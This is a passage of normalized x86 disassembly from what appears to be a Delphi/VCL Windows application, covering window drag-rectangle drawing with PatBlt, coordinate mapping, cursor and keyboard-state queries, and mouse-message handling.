cmp [ edi + 0x98 ] 0x0
je r-xdata
lea ecx [ ebp - 0x9 ]
movzx edx [ ebp - 0x1 ]
mov eax edi
mov si 0xffe1
call sub_40484c
mov [ ebp - 0xa ] al
jmp r-xdata
mov eax [ edi + 0x98 ]
neg eax
mov [ edi + 0x98 ] eax
sub_4513c0
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
movzx eax [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
movzx ecx [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_45140c
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x152 ] 0x0
je r-xdata
movzx eax [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
movzx ecx [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x154 ]
call [ ebx + 0x150 ]
sub_451458
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x4c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x64
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_451573
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x48 ]
call sub_424fec
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45157a
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_4515a4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp edx
mov [ esp ] eax
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx edi
mov eax [ esp ]
call sub_4503d4
movzx eax [ ebp + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_404800
mov esi [ eax + 0x40 ]
mov eax [ esp + 0x9 ]
push eax
movzx eax [ ebp + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_40484c
mov eax [ esp + 0x9 ]
push eax
movzx eax [ ebp + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ edi + 0xc ]
mov si 0xffc3
call sub_40484c
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
movzx eax [ esp + 0x4 ]
mov [ ebp + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_40484c
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ edi + 0xc ]
mov si 0xffb5
call sub_40484c
jmp r-xdata
sub_451694
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0x94 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_418420
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1db ] 0x0
je r-xdata
mov eax ebx
call sub_451b80
cmp [ ebx + 0x94 ] 0x0
je r-xdata
mov eax ebx
call sub_450820
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_450834
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_418470
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_451874
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_450324
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x1b0 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0x94 ]
mov ecx ebx
mov edx edi
mov si 0xffbd
call sub_40484c
test al al
jne r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x1b0 ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x94 ]
call sub_4585f8
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44dc08
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_451860
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0x94 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_4585f8
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x8 ] edi
mov eax [ ebp - 0xc ]
movzx edx [ ebp + 0x8 ]
mov [ eax + 0x5c ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x60 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x4c ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_4585f8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb5
call sub_40484c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_404650
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_4501b4
test esi esi
je r-xdata
sub_451874
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0x94 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbd
call sub_40484c
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_452c9c
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_40484c
mov eax esi
call sub_450254
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_450210
mov ecx eax
xor edx edx
xor eax eax
call sub_418448
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_40484c
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_45191c
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xb2 ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub_45194c
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
movzx edx [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_4519b8
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_451a78
sub_4519e8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_451a18
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_4503d4
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_451a44
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_451a78
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ ebx ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov edi [ eax ]
call [ edi + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ ebx ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ ebx ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ esi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ esi ] eax
sub_451b4c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_451b80
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0x94 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xa0 ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0x9c ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x90 ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xa8 ] eax
jmp r-xdata
mov eax [ ebx + 0x94 ]
movzx eax [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x90 ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa4 ] eax
mov eax [ ebx + 0x94 ]
movzx eax [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_451bf4
push ebx
mov ebx eax
mov eax [ edx ]
mov [ ebx + 0x40 ] eax
mov eax [ edx + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ edx + 0x8 ]
sub eax [ edx ]
mov [ ebx + 0x48 ] eax
mov eax [ edx + 0xc ]
sub eax [ edx + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_44fda0
mov eax ebx
call sub_45342c
pop ebx
retn
sub_451c28
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
xor edx edx
mov eax esi
call sub_43bd90
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x109
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x298 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov dl 0x1
mov eax esi
call sub_43bd90
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x298 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_450430
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0x100 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
add eax 0xfffffe00
cmp eax 0x7
ja r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
jmp [ eax * 4 + jump_table_451d01 ]
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_4472d8
jmp r-xdata
test [ esi + 0x52 ] 0x8
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
sub eax 0x3
jne r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
movzx eax [ r-xdata ]
and ax [ esi + 0x54 ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_40484c
jmp r-xdata
lea eax [ ebp - 0x115 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x115 ]
call sub_43bc90
mov [ ebp - 0xc ] al
movzx eax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_40484c
jmp r-xdata
mov eax [ rw-data ]
call sub_45d598
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_45d524
mov [ ebp - 0x15 ] 0x0
mov eax [ rw-data ]
mov edi [ eax + 0x28 ]
test edi edi
je r-xdata
cmp [ ebp - 0x15 ] 0x0
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call sub_447430
jmp r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov eax esi
call sub_4585f8
mov edx eax
mov eax edi
mov ecx esi
mov edi [ eax ]
call [ edi + 0xe0 ]
mov [ ebp - 0x15 ] al
jmp r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45d664
jmp r-xdata
xor edx edx
mov eax esi
call sub_43bd90
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x30 ]
call sub_4585f8
mov edx eax
mov eax edi
mov ecx esi
mov edi [ eax ]
call [ edi + 0xe0 ]
mov [ ebp - 0x15 ] al
jmp r-xdata
mov eax [ ebp - 0x14 ]
call sub_4585f8
mov edx eax
mov eax [ rw-data ]
mov eax [ eax + 0x28 ]
mov ecx esi
mov edi [ eax ]
call [ edi + 0xe0 ]
mov [ ebp - 0x15 ] al
sub_451ef8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_40aadc
mov edi eax
mov eax [ esi + 0x64 ]
call sub_40ab08
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_450430
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_40a8f4
call sub_40a868
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_40a868
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_451fa0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx eax [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
movzx eax [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_451fd4
push ebp
mov ebp esp
push ebx
sub al 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x180 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x180 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
dec al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x184 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x184 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
dec al
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x180 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x40 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx eax [ eax + 0x61 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x188 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x188 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x184 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x44 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx eax [ eax + 0x61 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x18c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x18c ]
jne r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x188 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx eax [ eax + 0x61 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x4c ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx eax [ eax + 0x61 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
sub_4521f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
lea ebx [ ebp - 0x8 ]
mov eax [ ebx ]
push eax
push r-xdata
mov eax [ ebx ]
push eax
push sub_451f94
push ebp
call sub_451fa0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov eax [ ebx ]
push eax
push sub_4534e8
mov eax [ ebx ]
push eax
push sub_453480
mov eax [ ebx ]
test [ eax + 0x1c ] 0x2
jne r-xdata
xor ecx ecx
jmp r-xdata
push ebp
xor eax eax
call sub_451fd4
pop ecx
test al al
jne r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov eax [ ebx ]
push eax
push sub_4534b8
mov eax [ ebx ]
push eax
push sub_453460
mov eax [ ebx ]
test [ eax + 0x1c ] 0x2
jne r-xdata
mov cl 0x1
xor ecx ecx
jmp r-xdata
push ebp
mov al 0x1
call sub_451fd4
pop ecx
test al al
jne r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov eax [ ebx ]
push eax
push sub_453490
mov eax [ ebx ]
push eax
push sub_4534a8
mov eax [ ebx ]
test [ eax + 0x1c ] 0x2
jne r-xdata
mov cl 0x1
xor ecx ecx
jmp r-xdata
push ebp
mov al 0x2
call sub_451fd4
pop ecx
test al al
jne r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov eax [ ebx ]
push eax
push sub_4534d0
mov eax [ ebx ]
push eax
push sub_453470
mov eax [ ebx ]
test [ eax + 0x1c ] 0x2
jne r-xdata
mov cl 0x1
xor ecx ecx
jmp r-xdata
push ebp
mov al 0x3
call sub_451fd4
pop ecx
test al al
jne r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov cl 0x1
sub_452393
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x110 ]
je r-xdata
cmp [ ebx + 0x112 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
pop ebx
retn
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
